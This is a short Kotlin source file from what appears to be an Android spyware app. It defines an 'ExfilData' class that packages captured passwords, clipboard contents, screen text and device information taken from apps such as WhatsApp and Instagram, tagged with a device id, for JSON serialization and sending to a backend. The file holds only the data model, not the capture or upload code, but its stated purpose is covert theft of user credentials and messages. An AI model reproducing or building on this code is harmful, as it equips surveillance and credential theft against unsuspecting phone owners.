package com.yourpackage.data

import com.google.gson.Gson

/**
 * Data class representing a single captured piece of data.
 * This is the main data structure used throughout the app and sent to the backend.
 */
data class ExfilData(
    val type: String,          // "password", "clipboard", "screen_text", "device_info"
    val app: String,           // Package name: com.whatsapp, com.instagram.android, etc.
    val data: String,          // JSON string of the actual captured data
    val device_id: String,     // Unique device identifier
    val timestamp: Long = System.currentTimeMillis() // Unix timestamp in milliseconds
) {
    /**
     * Convert this object to a JSON string for storage or network transmission.
     */
    fun toJson(): String = Gson().toJson(this)

    companion object {
        /**
         * Create an ExfilData object from a JSON string.
         */
        fun fromJson(json: String): ExfilData = Gson().fromJson(json, ExfilData::class.java)
    }
}